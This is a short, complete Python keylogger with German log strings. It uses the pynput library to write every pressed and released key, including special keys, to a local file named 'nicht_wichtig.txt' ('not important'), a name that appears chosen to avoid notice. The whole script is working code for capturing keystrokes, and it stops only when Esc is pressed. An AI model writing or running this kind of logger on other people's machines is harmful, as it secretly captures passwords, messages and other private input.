from pynput import keyboard

log_file = "nicht_wichtig.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"Taste gedrückt: {key.char}\n")
        except AttributeError:
            f.write(f"Spezialtaste gedrückt: {key}\n")

def on_release(key):
    with open(log_file, "a") as f:
        f.write(f"Taste losgelassen: {key}\n")
    if key == keyboard.Key.esc:
        # Listener stoppen
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()